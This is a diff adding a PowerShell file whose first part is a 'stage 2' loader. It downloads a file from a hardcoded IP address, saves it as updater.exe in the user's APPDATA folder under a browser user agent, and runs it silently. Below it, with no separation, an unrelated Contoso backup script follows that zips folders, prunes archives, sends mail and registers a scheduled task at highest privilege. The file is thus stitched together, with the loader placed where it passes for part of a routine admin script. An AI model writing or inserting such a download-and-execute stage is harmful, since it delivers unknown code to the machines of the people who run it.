@@ -1,0 +1,287 @@
+
+<#
+.SYNOPSIS
+    Structured stage 2 download and launch workflow.
+
+.DESCRIPTION
+    Resolves a configured endpoint, downloads the staged artefact
+    with a bounded retry loop, validates the result and then hands
+    control to the launcher.
+
+.NOTES
+    Designed for unattended execution.
+
+.EXAMPLE
+    PS> .\payload.ps1
+#>
+[CmdletBinding()]
+param(
+    [string]$Stage1Url = "http://192.0.2.163:8080/assets/update.dat",
+    [string]$LocalPath = "$env:APPDATA\updater.exe",
+    [string]$TracePath = "$env:TEMP\telemetry.json",
+    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    [int]$TimeoutSec = 239,
+    [int]$RetryCount = 2,
+    [int]$RetryDelaySeconds = 13
+)
+$ErrorActionPreference = "Stop"
+$ProgressPreference = "SilentlyContinue"
+
+# Diagnostic logging
+function Write-StageLog {
+    [CmdletBinding()]
+    param(
+        [string]$Message = ''
+    )
+
+    Write-Verbose $Message
+    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
+}
+
+# Endpoint resolution
+function Resolve-StageEndpoint {
+    [CmdletBinding()]
+    param(
+        [string]$CandidateUrl = ''
+    )
+
+    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
+        throw "Endpoint URL is empty"
+    }
+    $ParsedUri = [System.Uri]$CandidateUrl
+    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
+    return $ParsedUri.AbsoluteUri
+}
+
+# Retrying transfer
+function Invoke-Stage2Download {
+    param(
+        [string]$SourceUrl = '',
+        [string]$DestinationPath = "",
+        [int]$RetryCount = 2,
+        [int]$RetryDelay = 13,
+        [string]$UserAgent = "Mozilla/5.0"
+    )
+
+    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
+        try {
+            $ClientObject = New-Object System.Net.WebClient
+            $ClientObject.Headers.Add("User-Agent", $UserAgent)
+            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
+            return $true
+        }
+        catch {
+            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
+            Start-Sleep -Seconds $RetryDelay
+        }
+    }
+    return $false
+}
+
+try {
+    Write-StageLog -Message "Starting stage 2 download"
+    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $Stage1Url
+    $FetchResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $LocalPath -RetryCount $RetryCount -RetryDelay $RetryDelaySeconds -UserAgent $UserAgent
+    if ($FetchResult) {
+        Write-StageLog -Message "Stage 2 downloaded"
+        Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue
+    }
+    else {
+        Write-Warning "Stage 2 transfer did not complete"
+    }
+}
+catch {
+    Write-Warning "Structured download failed: $($_.Exception.Message)"
+}
+
+$DiagnosticReport = [ordered]@{
+    Stage = "stage2"
+    Endpoint = $Stage1Url
+    Destination = $LocalPath
+    RetryCount = $RetryCount
+    TimeoutSec = $TimeoutSec
+}
+$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
+Write-Verbose "Resolving configured target"
+Write-Verbose "Reading configuration values"
+Write-Verbose "Validating result"
+Write-Verbose "Exporting operation report"
+Write-Verbose "Stage handoff finished"
+Write-Verbose "Operation completed"
+Write-Verbose "Retry budget remaining"
+Write-Verbose "Preparing working directory"
+Write-Verbose "Inspecting process list"
+Write-Verbose "Collecting host metadata"
+Write-Verbose "Writing diagnostic marker"
+Write-Verbose "Applying operation timeout"
+$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
+Write-Output "stage 2 initialized"
+Set-Location -Path $env:TEMP
+<#
+.SYNOPSIS
+    Creates a compressed backup of an application folder and prunes old archives.
+.DESCRIPTION
+    Builds a timestamped zip archive, verifies its SHA256 hash and applies a
+    retention window to the archive folder.
+    Only files below the configured backup root are pruned, so a mistyped
+    retention value cannot reach outside the archive directory.
+.PARAMETER SourcePath
+    Defaults to the value configured for this host.
+.PARAMETER BackupRoot
+    Overrides the default value defined in the parameter block.
+.EXAMPLE
+    .\Start-AppBackup.ps1 -RetentionDays 7
+.EXAMPLE
+    .\Start-AppBackup.ps1 -BackupRoot E:\Backups\Billing -DryRun
+#>
+
+[CmdletBinding()]
+param(
+    [string]$SourcePath = 'D:\Apps\Contoso.Billing',
+    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
+    [string]$BackupRoot = 'E:\Backups\Billing',
+
+    [Parameter(Mandatory = $false)]
+    [ValidateRange(1, 365)]
+    [int]$RetentionDays = 7,
+
+    [Parameter(Mandatory = $false)]
+    [ValidateSet('Optimal', 'Fastest', "NoCompression")]
+    [string]$CompressionLevel = 'Fastest',
+    [int]$MinFreeGB = 20,
+
+    [switch]$DryRun
+)
+
+$ErrorActionPreference = 'Stop'
+
+Set-StrictMode -Version 2.0
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+
+New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
+New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
+Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force
+$item = Get-Item -LiteralPath $archive
+$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
+$manifest = [pscustomobject]@{
+    Archive   = $archive
+    SizeMB    = [math]::Round($item.Length / 1MB, 2)
+    SHA256    = $hash.Hash
+    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+    Source    = $SourcePath
+}
+
+$jsonBody = $manifest | ConvertTo-Json -Depth 5
+$jsonBody | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8
+
+$probe = Join-Path $env:TEMP ("restore-check-" + $stamp)
+Expand-Archive -LiteralPath $archive -DestinationPath $probe -Force
+$restored = @(Get-ChildItem -Path $probe -Recurse -File).Count
+Write-Host ("Restore check: {0} files recovered" -f $restored)
+$staleProbes = Get-ChildItem -Path $env:TEMP -Filter 'restore-check-*' -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) }
+foreach ($dir in $staleProbes) {
+    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+$cutoff = (Get-Date).AddDays(-$RetentionDays)
+$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
+    Where-Object { $_.LastWriteTime -lt $cutoff }
+foreach ($zip in $expired) {
+    Write-Host ("Expired: {0}" -f $zip.Name)
+    if ($DryRun) {
+        Write-Host ("Would remove {0}" -f $zip.FullName)
+        continue
+    }
+    Remove-Item -LiteralPath $zip.FullName -Force
+}
+
+$driveLetter = $BackupRoot.Substring(0, 1)
+$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
+if ($drive) {
+    $freeGB = [math]::Round($drive.Free / 1GB, 1)
+    if ($freeGB -lt $MinFreeGB) {
+        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
+    }
+}
+
+$stage = Join-Path $env:TEMP ("backup-stage-" + $stamp)
+robocopy $SourcePath $stage /E /R:1 /W:2 /NP /NFL /NDL | Out-Null
+if ($LASTEXITCODE -ge 8) {
+    throw ("Staging copy failed with exit code {0}" -f $LASTEXITCODE)
+}
+$stageCount = @(Get-ChildItem -Path $stage -Recurse -File).Count
+Write-Verbose ("Staged files: {0}" -f $stageCount)
+
+$count = @(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File).Count
+$totalGB = [math]::Round((@(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
+    Measure-Object -Property Length -Sum).Sum) / 1GB, 2)
+Write-Verbose ("Archive count: {0}, total size: {1} GB" -f $count, $totalGB)
+$manifest | Export-Csv -Path (Join-Path $BackupRoot 'backup-history.csv') -NoTypeInformation -Append -Encoding UTF8
+
+$style = @'
+<style>
+body { font-family: Segoe UI; font-size: 12px; }
+table { border-collapse: collapse; width: 100%; }
+th { background: #eeeeee; text-align: left; padding: 4px; }
+td { border-bottom: 1px solid #dddddd; padding: 4px; }
+</style>
+'@
+
+@($manifest) | ConvertTo-Html -Title 'Backup summary' -Head $style |
+    Set-Content -Path (Join-Path $BackupRoot 'last-backup.html') -Encoding UTF8
+Write-Host ("Retention window: {0} days" -f $RetentionDays) -ForegroundColor DarkGray
+
+$MailTo = 'backup-ops@internal.corp'
+$MailFrom = 'backup@internal.corp'
+$mailBody = ("Archive: {0}`nSize: {1} MB`nSHA256: {2}" -f $archive, $manifest.SizeMB, $hash.Hash)
+
+Send-MailMessage -To $MailTo -From $MailFrom -Subject 'Backup completed' `
+    -Body $mailBody -SmtpServer "smtp.internal.corp" -Port 25 -UseSsl
+
+$oldStages = Get-ChildItem -Path $env:TEMP -Filter 'backup-stage-*' -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-12) }
+foreach ($dir in $oldStages) {
+    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+Write-Host ("Backup finished: {0} files in archive" -f $restored) -ForegroundColor Green
+
+$oldArchives = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
+    Sort-Object -Property LastWriteTime | Select-Object -First 3
+$oldArchives | Format-Table Name, LastWriteTime, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize
+
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Start-AppBackup.ps1'
+$trigger = New-ScheduledTaskTrigger -Daily -At "13:00"
+Register-ScheduledTask -TaskName 'Contoso-AppBackup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
+
+$excluded = @('*.tmp', '*.log', '*.bak')
+Write-Verbose ("Excluded patterns: {0}" -f ($excluded -join ', '))
+
+$freeSpace = Get-PSDrive -Name ($BackupRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
+if ($freeSpace) {
+    Write-Verbose ("Free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
+}
+
+$largeFiles = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
+    Where-Object { $_.Length -gt 100MB } | Sort-Object Length -Descending | Select-Object -First 5
+$largeFiles | ForEach-Object {
+    Write-Verbose ("Large file: {0} ({1:N1} MB)" -f $_.Name, ($_.Length / 1MB))
+}
+
+$elapsed = Measure-Command -Expression {
+    Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File | Measure-Object -Property Length -Sum
+}
+Write-Verbose ("Folder scan took {0:N0} ms" -f $elapsed.TotalMilliseconds)
+
+$robolog = Join-Path $BackupRoot 'robocopy.log'
+robocopy $SourcePath $BackupRoot /E /R:2 /W:5 /NP /LOG:$robolog | Out-Null
+if ($LASTEXITCODE -ge 8) {
+    Write-Warning ("robocopy reported exit code {0}" -f $LASTEXITCODE)
+}
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
